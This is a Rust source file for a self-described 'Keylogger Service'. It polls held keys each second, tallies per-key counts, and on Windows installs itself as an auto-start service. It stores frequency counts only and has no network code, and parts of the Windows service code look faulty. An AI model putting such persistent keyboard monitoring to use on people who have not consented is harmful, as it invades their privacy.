#[cfg(target_os = "windows")]
use std::ffi::OsString;
#[cfg(target_os = "windows")]
use windows_service::raw::*;
#[cfg(target_os = "windows")]
use windows_service::service::*;
#[cfg(target_os = "windows")]
use windows_service::service_dispatcher::*;
#[cfg(target_os = "windows")]
use windows_service::service_control_handler::*;
#[cfg(target_os = "windows")]
use windows_service::service_manager::*;
use std::time::Duration;
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

const SERVICE_NAME: &str = "KeyloggerService";
const SERVICE_DISPLAY_NAME: &str = "Keylogger Service";
const SERVICE_DESCRIPTION: &str = "A cross-platform keylogger service";

#[cfg(target_os = "windows")]
pub fn run_as_service() -> Result<(), Box<dyn std::error::Error>> {
    service_dispatcher::start(SERVICE_NAME, service_main)?;
    Ok(())
}

#[cfg(target_os = "windows")]
define_windows_service!(ffi_service_main, service_main);

#[cfg(target_os = "windows")]
fn service_main(_arguments: Vec<OsString>) {
    if let Err(_e) = run_service() {
        // 服务启动失败
    }
}

#[cfg(target_os = "windows")]
fn run_service() -> Result<(), Box<dyn std::error::Error>> {
    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();

    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Stop => {
                running_clone.store(false, Ordering::SeqCst);
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    let status_handle = service_control_handler::register(SERVICE_NAME, event_handler)?;

    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Running,
        controls_accepted: ServiceControlAccept::STOP,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })?;

    // 启动键盘记录功能
    let device_state = DeviceState::new();
    let mut key_count: HashMap<Keycode, usize> = HashMap::new();

    while running.load(Ordering::SeqCst) {
        let keys = device_state.get_keys();
        for key in keys {
            *key_count.entry(key).or_insert(0) += 1;
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
        crate::save_keypress(&key_count);
    }

    // 服务停止时更新状态
    status_handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: ServiceState::Stopped,
        controls_accepted: ServiceControlAccept::empty(),
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })?;

    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn run_service() -> Result<(), Box<dyn std::error::Error>> {
    let device_state = DeviceState::new();
    let mut key_count: HashMap<Keycode, usize> = HashMap::new();

    loop {
        let keys = device_state.get_keys();
        for key in keys {
            *key_count.entry(key).or_insert(0) += 1;
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
        crate::save_keypress(&key_count);
    }
}

#[cfg(target_os = "windows")]
pub fn install_service() -> Result<(), Box<dyn std::error::Error>> {
    use std::env;
    use windows_service::service::{ServiceAccess, ServiceInfo};
    use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)?;

    let service_binary_path = env::current_exe()?;

    let service_info = ServiceInfo {
        name: OsString::from(SERVICE_NAME),
        display_name: OsString::from(SERVICE_DISPLAY_NAME),
        service_type: ServiceType::OWN_PROCESS,
        start_type: windows_service::service::ServiceStartType::AutoStart,
        error_control: windows_service::service::ServiceErrorControl::Normal,
        executable_path: service_binary_path,
        launch_arguments: vec![],
        dependencies: vec![],
        account_name: None,
        account_password: None,
    };

    manager.create_service(&service_info, ServiceAccess::CHANGE_CONFIG)?;
    Ok(())
}

#[cfg(target_os = "windows")]
pub fn uninstall_service() -> Result<(), Box<dyn std::error::Error>> {
    use windows_service::service::{ServiceAccess, ServiceState};
    use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)?;

    let service = manager.open_service(
        SERVICE_NAME,
        ServiceAccess::STOP | ServiceAccess::DELETE,
    )?;

    service.delete()?;
    Ok(())
}